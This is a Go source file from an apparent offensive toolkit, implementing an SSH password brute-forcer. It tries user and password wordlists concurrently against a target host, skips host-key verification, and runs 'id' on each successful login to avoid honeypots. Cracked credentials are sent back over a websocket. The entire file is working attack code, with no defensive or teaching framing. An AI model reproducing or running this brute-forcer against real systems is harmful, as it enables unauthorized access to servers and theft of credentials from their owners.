package attacker

import (
	"bytes"
	"time"

	"../logger"
	"../utils"
	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

// SSHBruter brute force the ssh service.
// AJAX API.
type SSHBruter struct {
	mconn           *utils.MuxConn
	target          string
	userList        []string
	passwdList      []string
	port            string
	goroutinesCount int
	Users           []string
	Passwds         []string
}

// NewSSHBruter returns a new ssh bruter.
func NewSSHBruter() *SSHBruter {
	return &SSHBruter{mconn: &utils.MuxConn{}}
}

// Set implements Attacker interface.
// Params should be {target, port string,
//     userlist, passwdlist string, goroutinesCount int}
func (s *SSHBruter) Set(v ...interface{}) {
	s.mconn.Conn = v[0].(*websocket.Conn)
	s.target = v[1].(string)
	s.port = v[2].(string)

	ul, err := utils.ReadFile(v[3].(string))
	if err != nil {
		logger.Red.Println(err)
		return
	}
	s.userList = ul

	pl, err := utils.ReadFile(v[4].(string))
	if err != nil {
		logger.Red.Println(err)
		return
	}
	s.passwdList = pl
	s.goroutinesCount = v[5].(int)
}

// Report implements Attacker interface
func (s *SSHBruter) Report() map[string]interface{} {
	return map[string]interface{}{
		"users":   s.Users,
		"passwds": s.Passwds,
	}
}

// Run the SSHBruter.
func (s *SSHBruter) Run() {
	logger.Green.Println("Brute Forcing SSH")

	blockers := make(chan struct{}, s.goroutinesCount)
	done := make(chan struct{})
Loop:
	for _, u := range s.userList {
		for _, p := range s.passwdList {
			select {
			default:
				blockers <- struct{}{}
				go s.connect(done, blockers, u, p)
			case <-done:
				continue Loop
			}
		}
	}

	// Wait for all goroutines to finish.
	for i := 0; i < cap(blockers); i++ {
		blockers <- struct{}{}
	}
}

func (s *SSHBruter) connect(done, blocker chan struct{}, user, pass string) {
	defer func() { <-blocker }()

	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         5 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	sshConfig.SetDefaults()
	c, err := ssh.Dial("tcp", s.target+":"+s.port, sshConfig)
	if err == nil {
		logger.Blue.Printf("Got it! user:%s, passwd: %s\n", user, pass)
		if s.check(c) {
			s.Users = append(s.Users, user)
			s.Passwds = append(s.Passwds, pass)
			ret := map[string]interface{}{
				"user":   user,
				"passwd": pass,
			}
			s.mconn.Send(ret)
			done <- struct{}{}
		}
		c.Close()
		return
	}
}

// check create a new ssh session and send a command to
// make sure we didn't hit a honeypot.
func (s *SSHBruter) check(c *ssh.Client) bool {
	session, err := c.NewSession()
	if err == nil {
		defer session.Close()

		var output bytes.Buffer
		session.Stdout = &output
		if err = session.Run("id"); err == nil {
			logger.Blue.Printf(output.String())
			return true
		}
	}
	return false
}
